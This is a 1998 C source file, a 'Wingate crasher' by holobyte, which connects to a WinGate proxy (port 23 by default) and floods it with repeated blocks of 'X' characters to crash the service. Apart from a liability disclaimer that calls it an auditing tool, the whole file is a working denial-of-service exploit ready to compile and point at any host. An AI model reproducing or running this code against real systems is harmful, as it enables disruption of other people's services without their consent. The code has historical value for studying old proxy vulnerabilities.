
/* Blah, blah, blah, I am not liable for anything this program
   does, or what anyone does with it.  THIS PROGRAM COMES WITH
   NO WARRANTY, AND THE AUTHOR IS IN NO EVENT LIABLE FOR ANYTHING
   THAT HAPPENS WITH IT, INCLUDING IF IT SCREWS YOUR SYSTEM, OR
   SOMEONE USES IT TO SCREW YOUR SYSTEM, OR YOU GET IN TROUBLE
   FOR SCREWING SOMEONE'S SYSTEM.  This program is for auditing
   your own system only, not for DoS attacks. I am not liable
   for anything you or anyone else does with this program.  This
   program is for auditing and informational purposes only!
*/
/* Feel free to modify this shit, but give me credit.

   11/14/1998 holobyte
   holobyte@holobyte.org
*/
/* Based on the bugtraq release by g23@usa.net */

#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netdb.h>
#include <unistd.h>
#include <netinet/in.h>

wingatecrash_main (int argc, char *argv[]) {
	int sockfd;
	struct sockaddr_in staddr;
	int port;
	struct hostent *tmp_host;
	unsigned long int addr;
	int connfd;
	int i;

	printf("Wingate crasher by holobyte <holobyte@holobyte.org>\n\n");
	if (argc != 2 && argc != 3) { printf("Usage: %s <wingate> [port(defualt=23)]\n",argv[0]); exit(1); }
	if (argc == 2) { port=23; } else { port=atoi(argv[2]); }
	if (!(port > 0 && port < 65536)) { printf("Invalid port\n"); exit(2); }
	/* If this returns -1 we'll try to look it up.  I don't assume anyone will be putting
	in 255.255.255.255, so I'll go with inet_addr() */
	bzero(&staddr,sizeof(staddr));
	if ((staddr.sin_addr.s_addr = inet_addr(argv[1])) == -1) {
		tmp_host = gethostbyname(argv[1]);
		if (tmp_host == NULL) { printf("Could not get valid addr info on %s: tmp_host\n",argv[1]); exit(7);} else {
			memcpy((caddr_t *)&staddr.sin_addr.s_addr,tmp_host->h_addr,tmp_host->h_length);
			if (staddr.sin_addr.s_addr == -1) { printf("Could not valid addr info on %s: addr -1\n",argv[1]); exit(8); }
		}
	}
	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) { perror("Socket"); exit(3); }
	staddr.sin_family = AF_INET;
	staddr.sin_port = htons(port);
	if (connect(sockfd, (struct sockaddr *) &staddr, sizeof(staddr)) < 0) { perror("Connect"); exit(4); }
	printf("Connected... Crashing");
	for (i=0;i<100;i++) {
		if ((write(sockfd,"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",44)) < 0) { perror("Write"); exit(5); }
		putc('.',stdout);
		fflush(stdout);
	}
	if (write(sockfd,"\n",1) < 0) { perror("Final Write"); exit(6); }
	putc('\n',stdout);
	fflush(stdout);
	close(sockfd);
}
